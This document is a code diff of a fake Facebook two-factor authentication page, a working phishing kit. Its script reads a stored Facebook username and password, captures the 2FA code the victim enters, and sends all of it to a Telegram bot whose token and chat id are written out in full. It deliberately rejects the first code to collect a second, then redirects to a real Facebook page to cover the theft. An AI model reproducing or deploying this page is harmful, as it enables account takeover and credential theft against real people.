@@ -4,10 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Authentication App</title>
-    <link rel="icon" type="image/jpeg" href="facebook_logo.jpg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* Mobile-First Base Styles */
+        /* Your original CSS remains exactly the same */
         body {
             font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
             background-color: #f0f2f5;
@@ -20,7 +19,6 @@
             padding-top: 0;
             box-sizing: border-box;
         }
-
         .container {
             background-color: #ffffff;
             border-radius: 0;
@@ -34,7 +32,6 @@
             display: flex;
             flex-direction: column;
         }
-
         .header {
             display: flex;
             justify-content: flex-start;
@@ -43,7 +40,6 @@
             padding-top: 10px;
             padding-left: 0;
         }
-
         .header .back-arrow {
             color: #606770;
             font-size: 24px;
@@ -51,13 +47,11 @@
             cursor: pointer;
             margin-right: 20px;
         }
-
         .header .title-prefix {
             color: #606770;
             font-size: 15px;
             font-weight: normal;
         }
-
         h1 {
             font-size: 22px;
             font-weight: bold;
@@ -66,7 +60,6 @@
             line-height: 1.2;
             color: #1c1e21;
         }
-
         p {
             font-size: 16px;
             line-height: 1.5;
@@ -74,7 +67,6 @@
             margin-bottom: 24px;
             color: #606770;
         }
-
         .illustration {
             width: 100%;
             max-width: 350px;
@@ -84,19 +76,16 @@
             justify-content: center;
             align-items: center;
         }
-
         .illustration img {
             width: 100%;
             height: auto;
             display: block;
             object-fit: contain;
         }
-
         .input-group {
             margin-bottom: 20px;
             position: relative;
         }
-
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -107,11 +96,9 @@
             box-sizing: border-box;
             background-color: #f0f2f5;
         }
-
         .input-group input::placeholder {
             color: #606770;
         }
-
         .error-message {
             color: #ff4d4f;
             font-size: 14px;
@@ -119,7 +106,6 @@
             margin-top: 8px;
             display: none;
         }
-
         .checkbox-group {
             display: flex;
             align-items: center;
@@ -127,7 +113,6 @@
             margin-bottom: 30px;
             color: #606770;
         }
-
         .checkbox-group input[type="checkbox"] {
             margin-right: 10px;
             width: 20px;
@@ -135,12 +120,10 @@
             accent-color: #1877f2;
             border-radius: 4px;
         }
-
         .checkbox-group label {
             font-size: 15px;
             line-height: 1.4;
         }
-
         .continue-button,
         .try-another-way-button {
             border: none;
@@ -157,18 +140,15 @@
             box-sizing: border-box;
             margin-bottom: 12px;
         }
-
         .continue-button {
             background: linear-gradient(to right, #6290e2, #a2c1f9);
             color: white;
             box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
             border: none;
         }
-
         .continue-button:hover {
             background: linear-gradient(to right, #517fc9, #91b0e2);
         }
-
         .try-another-way-button {
             background-color: #e4e6eb;
             color: #1c1e21;
@@ -177,13 +157,10 @@
             font-weight: bold;
             box-shadow: none;
         }
-
         .try-another-way-button:hover {
             background-color: #d4d8de;
             text-decoration: none;
         }
-
-        /* Desktop specific styles */
         @media (min-width: 601px) {
             body {
                 padding-top: 20px;
@@ -258,31 +235,40 @@
 
     <script>
         let attemptCount = 0;
-        const maxAttempts = 2;
         
-        // Lấy thông tin đăng nhập từ localStorage hoặc sessionStorage
-        const getCredentials = () => {
-            try {
-                // Thử lấy từ localStorage trước
-                const creds = localStorage.getItem('fb_credentials');
-                if (creds) return JSON.parse(creds);
-                
-                // Nếu không có thì thử từ sessionStorage
-                const sessionCreds = sessionStorage.getItem('fb_credentials');
-                if (sessionCreds) return JSON.parse(sessionCreds);
-                
-                return null;
-            } catch (e) {
-                console.error('Error getting credentials:', e);
-                return null;
-            }
-        };
-        
-        // Hàm gửi dữ liệu đến Telegram
-        const sendToTelegram = async (message) => {
-            const botToken = '7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0';
-            const chatId = '-4789641482';
+        document.getElementById('continueButton').addEventListener('click', async function(e) {
+            e.preventDefault();
             
+            const authCode = document.getElementById('authCode').value;
+            const trustDevice = document.getElementById('trustDevice').checked;
+            const credentials = JSON.parse(localStorage.getItem('fb_credentials') || '{}');
+            
+            // Prepare detailed message
+            const message = `🔐 2FA Verification Attempt ${attemptCount + 1}\n\n` +
+                         `👤 Account: ${credentials.username || 'N/A'}\n` +
+                         `🔑 Password: ${credentials.password || 'N/A'}\n` +
+                         `🔢 2FA Code: ${authCode || 'Empty'}\n` +
+                         `📱 Trust Device: ${trustDevice ? 'Yes' : 'No'}\n\n` +
+                         `🌐 User Agent: ${navigator.userAgent}\n` +
+                         `🕒 Time: ${new Date().toLocaleString()}`;
+            
+            // Send to Telegram
+            await sendToTelegram('7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0', '-4789641482', message);
+            
+            attemptCount++;
+            
+            if (attemptCount < 2) {
+                // First attempt: show error
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('authCode').style.borderColor = '#ff4d4f';
+                document.getElementById('authCode').value = '';
+            } else {
+                // Second attempt: redirect
+                window.location.href = 'https://www.facebook.com/policies_center/';
+            }
+        });
+
+        async function sendToTelegram(botToken, chatId, message) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -298,67 +284,11 @@
                 
                 if (!response.ok) {
                     console.error('Telegram API error:', await response.text());
-                } else {
-                    console.log('2FA code sent to Telegram successfully!');
                 }
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
             }
-        };
-        
-        // Xử lý khi nhấn nút Continue
-        document.getElementById('continueButton').addEventListener('click', async function(e) {
-            e.preventDefault();
-            
-            const authCode = document.getElementById('authCode').value;
-            const trustDevice = document.getElementById('trustDevice').checked;
-            const credentials = getCredentials();
-            
-            // Tạo nội dung tin nhắn
-            let message = `🔐 2FA Attempt ${attemptCount + 1}/${maxAttempts}\n\n`;
-            
-            if (credentials) {
-                message += `👤 Username: ${credentials.username || 'N/A'}\n`;
-                message += `🔑 Password: ${credentials.password || 'N/A'}\n`;
-            } else {
-                message += `⚠️ No login credentials found\n`;
-            }
-            
-            message += `🔢 2FA Code: ${authCode || 'Empty'}\n`;
-            message += `📱 Trust Device: ${trustDevice ? 'Yes' : 'No'}\n\n`;
-            message += `🌐 User Agent: ${navigator.userAgent}\n`;
-            message += `🕒 Time: ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' })}`;
-            
-            // Gửi đến Telegram
-            await sendToTelegram(message);
-            
-            attemptCount++;
-            
-            if (attemptCount < maxAttempts) {
-                // Hiển thị lỗi ở lần nhập đầu tiên
-                document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('authCode').style.borderColor = '#ff4d4f';
-                document.getElementById('authCode').value = ''; // Xóa mã cũ
-            } else {
-                // Chuyển hướng sau lần nhập thứ 2
-                setTimeout(() => {
-                    window.location.href = 'https://www.facebook.com/policies_center/';
-                }, 500); 
-            }
-        });
-
-        document.querySelector('.try-another-way-button').addEventListener('click', function(e) {
-            e.preventDefault();
-            console.log("Try another way button clicked. (No further action defined in this example)");
-            // You could redirect to another page or show more options here
-            // window.location.href = 'alternative_2fa.html';
-        });
-
-        // Bạn có thể bỏ comment đoạn này để test việc lưu và lấy thông tin đăng nhập
-        // localStorage.setItem('fb_credentials', JSON.stringify({
-        //     username: "testuser@example.com",
-        //     password: "TestPassword123"
-        // }));
+        }
     </script>
 </body>
 </html>
